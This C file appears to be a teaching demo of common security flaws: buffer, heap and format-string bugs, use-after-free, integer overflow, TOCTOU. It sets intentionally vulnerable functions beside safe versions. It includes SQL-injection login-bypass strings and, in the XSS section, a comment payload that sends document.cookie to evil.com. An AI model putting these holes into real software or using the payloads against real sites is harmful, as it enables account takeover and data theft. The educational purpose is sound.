/**
 * bo.c - Security Vulnerability Demonstrations
 * CS50-style educational examples of common security flaws
 *
 * WARNING: These are intentionally vulnerable examples for learning.
 * NEVER use patterns like these in production code.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// ============================================================================
// 1. BUFFER OVERFLOW
// ============================================================================
// Classic vulnerability: writing beyond allocated buffer bounds

void buffer_overflow_demo(void)
{
    printf("\n=== BUFFER OVERFLOW ===\n");

    char small_buffer[8];  // Only 8 bytes allocated

    // VULNERABLE: No bounds checking - can overwrite adjacent memory
    printf("Enter your name: ");
    gets(small_buffer);  // NEVER USE gets() - deprecated for this reason

    printf("Hello, %s\n", small_buffer);

    // What happens: If user enters more than 7 chars, it overwrites
    // adjacent stack memory, potentially including return address
}

// Safe version for comparison
void buffer_overflow_safe(void)
{
    char buffer[8];
    printf("Enter your name: ");
    fgets(buffer, sizeof(buffer), stdin);  // Bounds-checked!
    buffer[strcspn(buffer, "\n")] = '\0';  // Remove newline
    printf("Hello, %s\n", buffer);
}


// ============================================================================
// 2. STACK OVERFLOW (via recursion)
// ============================================================================
// Exhausting stack space through unbounded recursion

void stack_overflow_demo(int depth)
{
    char local_data[1024];  // Each call consumes stack space

    printf("Recursion depth: %d, stack address: %p\n", depth, (void*)local_data);

    // VULNERABLE: No base case or depth limit
    stack_overflow_demo(depth + 1);  // Eventually crashes with SIGSEGV
}

// Safe version with depth limit
void stack_overflow_safe(int depth, int max_depth)
{
    if (depth >= max_depth)
    {
        printf("Max depth %d reached safely.\n", max_depth);
        return;
    }
    char local_data[1024];
    printf("Depth: %d, addr: %p\n", depth, (void*)local_data);
    stack_overflow_safe(depth + 1, max_depth);
}


// ============================================================================
// 3. OUT-OF-BOUNDS MEMORY ACCESS
// ============================================================================
// Reading/writing memory outside allocated regions

void memory_exploration_demo(void)
{
    printf("\n=== OUT-OF-BOUNDS MEMORY ACCESS ===\n");

    int array[5] = {10, 20, 30, 40, 50};

    printf("Legitimate array contents:\n");
    for (int i = 0; i < 5; i++)
    {
        printf("array[%d] = %d at %p\n", i, array[i], (void*)&array[i]);
    }

    // VULNERABLE: Accessing beyond array bounds
    printf("\nPeeking beyond array (undefined behavior!):\n");
    for (int i = -3; i < 10; i++)  // Reading before and after
    {
        printf("array[%d] = %d at %p\n", i, array[i], (void*)&array[i]);
    }
    // This exposes whatever is on the stack - could be sensitive data,
    // return addresses, saved registers, etc.
}

// Demonstrating heap out-of-bounds
void heap_overflow_demo(void)
{
    printf("\n=== HEAP OVERFLOW ===\n");

    char *buf1 = malloc(16);
    char *buf2 = malloc(16);

    strcpy(buf1, "AAAA");
    strcpy(buf2, "BBBB");

    printf("Before overflow:\n");
    printf("buf1: %s at %p\n", buf1, (void*)buf1);
    printf("buf2: %s at %p\n", buf2, (void*)buf2);

    // VULNERABLE: Writing past buf1's allocation
    strcpy(buf1, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");  // 32 chars into 16 byte buffer

    printf("\nAfter overflow (buf2 may be corrupted):\n");
    printf("buf1: %s\n", buf1);
    printf("buf2: %s\n", buf2);  // Likely overwritten!

    free(buf1);
    free(buf2);
}


// ============================================================================
// 4. FORMAT STRING VULNERABILITY
// ============================================================================
// Allowing user input as format string

void format_string_demo(void)
{
    printf("\n=== FORMAT STRING VULNERABILITY ===\n");

    char user_input[100];
    int secret = 0xDEADBEEF;

    printf("Enter a message: ");
    fgets(user_input, sizeof(user_input), stdin);

    // VULNERABLE: User input used directly as format string
    printf(user_input);  // If user enters "%x %x %x", leaks stack data!

    // Attacker can:
    // - Read stack memory with %x, %s
    // - Write to memory with %n
    // - Crash program with %s pointing to invalid address

    printf("(Secret value was: 0x%x)\n", secret);
}

// Safe version
void format_string_safe(void)
{
    char user_input[100];
    fgets(user_input, sizeof(user_input), stdin);
    printf("%s", user_input);  // Format string is constant
}


// ============================================================================
// 5. SQL INJECTION (Simulated)
// ============================================================================
// Demonstrating the concept without actual database

void sql_injection_demo(void)
{
    printf("\n=== SQL INJECTION ===\n");

    char username[50];
    char password[50];
    char query[200];

    printf("Username: ");
    fgets(username, sizeof(username), stdin);
    username[strcspn(username, "\n")] = '\0';

    printf("Password: ");
    fgets(password, sizeof(password), stdin);
    password[strcspn(password, "\n")] = '\0';

    // VULNERABLE: String concatenation for SQL
    sprintf(query, "SELECT * FROM users WHERE username='%s' AND password='%s'",
            username, password);

    printf("\nGenerated query:\n%s\n", query);

    // Attack examples:
    // Username: admin'--
    // Password: anything
    // Result: SELECT * FROM users WHERE username='admin'--' AND password='...'
    //         The -- comments out the rest, bypassing password check!

    // Username: ' OR '1'='1
    // Password: ' OR '1'='1
    // Result: Always true, returns all users!

    printf("\nTry these attacks:\n");
    printf("  Username: admin'--\n");
    printf("  Username: ' OR '1'='1\n");
}

// Safe version would use parameterized queries (prepared statements)
// In C with SQLite: sqlite3_prepare_v2() + sqlite3_bind_text()


// ============================================================================
// 6. XSS - Cross-Site Scripting (Simulated)
// ============================================================================
// Demonstrating the concept for web output

void xss_demo(void)
{
    printf("\n=== CROSS-SITE SCRIPTING (XSS) ===\n");

    char user_comment[200];

    printf("Enter a comment for the webpage: ");
    fgets(user_comment, sizeof(user_comment), stdin);
    user_comment[strcspn(user_comment, "\n")] = '\0';

    // VULNERABLE: Directly embedding user input in HTML
    printf("\nGenerated HTML:\n");
    printf("<div class=\"comment\">%s</div>\n", user_comment);

    // Attack example:
    // Input: <script>alert('XSS!')</script>
    // Input: <img src=x onerror="document.location='http://evil.com/steal?c='+document.cookie">

    printf("\nTry this attack:\n");
    printf("  <script>alert('XSS!')</script>\n");
    printf("  <img src=x onerror=\"steal_cookies()\">\n");
}

// Safe version: HTML-encode special characters
void html_encode(const char *input, char *output, size_t output_size)
{
    size_t j = 0;
    for (size_t i = 0; input[i] && j < output_size - 6; i++)
    {
        switch (input[i])
        {
            case '<':  strcpy(&output[j], "&lt;");   j += 4; break;
            case '>':  strcpy(&output[j], "&gt;");   j += 4; break;
            case '&':  strcpy(&output[j], "&amp;");  j += 5; break;
            case '"':  strcpy(&output[j], "&quot;"); j += 6; break;
            case '\'': strcpy(&output[j], "&#39;");  j += 5; break;
            default:   output[j++] = input[i];
        }
    }
    output[j] = '\0';
}


// ============================================================================
// 7. USE-AFTER-FREE
// ============================================================================
// Accessing memory after it's been freed

typedef struct {
    char name[32];
    int id;
} User;

void use_after_free_demo(void)
{
    printf("\n=== USE-AFTER-FREE ===\n");

    User *user = malloc(sizeof(User));
    strcpy(user->name, "Alice");
    user->id = 42;

    printf("Before free: %s (ID: %d)\n", user->name, user->id);

    free(user);

    // VULNERABLE: user pointer is now dangling
    printf("After free: %s (ID: %d)\n", user->name, user->id);  // Undefined!

    // Danger: If another allocation reuses this memory,
    // we could read/write someone else's data
    char *new_data = malloc(sizeof(User));
    strcpy(new_data, "EVIL_DATA_HERE!");

    printf("After new alloc: %s\n", user->name);  // May show EVIL_DATA_HERE!

    free(new_data);
}


// ============================================================================
// 8. INTEGER OVERFLOW
// ============================================================================
// Arithmetic that wraps around due to fixed-size integers

void integer_overflow_demo(void)
{
    printf("\n=== INTEGER OVERFLOW ===\n");

    unsigned int small = 4294967290;  // Close to UINT_MAX
    printf("Starting value: %u\n", small);

    for (int i = 0; i < 10; i++)
    {
        small++;
        printf("After increment: %u\n", small);  // Wraps to 0!
    }

    // Security implication: size calculations
    unsigned int num_elements = 1073741824;  // 2^30
    unsigned int element_size = 8;
    unsigned int total_size = num_elements * element_size;  // Overflows to 0!

    printf("\n%u elements * %u bytes = %u (overflowed!)\n",
           num_elements, element_size, total_size);

    // malloc(0) or very small malloc -> buffer overflow when writing
}


// ============================================================================
// 9. NULL POINTER DEREFERENCE
// ============================================================================

void null_pointer_demo(void)
{
    printf("\n=== NULL POINTER DEREFERENCE ===\n");

    char *ptr = NULL;

    // VULNERABLE: No null check before dereference
    // printf("Value: %s\n", ptr);  // CRASH: SIGSEGV

    // Common pattern that leads to this:
    char *maybe_null = getenv("NONEXISTENT_VAR");
    if (1)  // Forgot to check: if (maybe_null)
    {
        // printf("Value: %s\n", maybe_null);  // Crashes if var not set
    }

    printf("(Commented out to prevent crash)\n");
}


// ============================================================================
// 10. RACE CONDITION (Conceptual - TOCTOU)
// ============================================================================
// Time-of-check to time-of-use vulnerability

void race_condition_demo(void)
{
    printf("\n=== RACE CONDITION (TOCTOU) ===\n");
    printf("Conceptual example - requires multi-threading to demonstrate\n\n");

    printf("Vulnerable pattern:\n");
    printf("  if (access(\"/tmp/file\", R_OK) == 0)  // CHECK\n");
    printf("  {\n");
    printf("      // Attacker replaces /tmp/file with symlink here!\n");
    printf("      fd = open(\"/tmp/file\", O_RDONLY);  // USE\n");
    printf("  }\n\n");

    printf("Between check and use, attacker can:\n");
    printf("  - Replace file with symlink to /etc/shadow\n");
    printf("  - Escalate privileges\n");
}


// ============================================================================
// MAIN - Menu to run demos
// ============================================================================

int main(void)
{
    int choice;

    printf("========================================\n");
    printf("  SECURITY VULNERABILITY DEMOS\n");
    printf("  Educational Examples - DO NOT USE\n");
    printf("========================================\n");

    printf("\n1. Buffer Overflow\n");
    printf("2. Stack Overflow (will crash!)\n");
    printf("3. Out-of-Bounds Memory Access\n");
    printf("4. Heap Overflow\n");
    printf("5. Format String Vulnerability\n");
    printf("6. SQL Injection (simulated)\n");
    printf("7. XSS (simulated)\n");
    printf("8. Use-After-Free\n");
    printf("9. Integer Overflow\n");
    printf("10. NULL Pointer Dereference\n");
    printf("11. Race Condition (conceptual)\n");
    printf("0. Exit\n");

    printf("\nChoose demo (0-11): ");
    scanf("%d", &choice);
    getchar();  // consume newline

    switch (choice)
    {
        case 1:  buffer_overflow_demo(); break;
        case 2:  stack_overflow_demo(0); break;
        case 3:  memory_exploration_demo(); break;
        case 4:  heap_overflow_demo(); break;
        case 5:  format_string_demo(); break;
        case 6:  sql_injection_demo(); break;
        case 7:  xss_demo(); break;
        case 8:  use_after_free_demo(); break;
        case 9:  integer_overflow_demo(); break;
        case 10: null_pointer_demo(); break;
        case 11: race_condition_demo(); break;
        case 0:  printf("Goodbye!\n"); break;
        default: printf("Invalid choice.\n");
    }

    return 0;
}
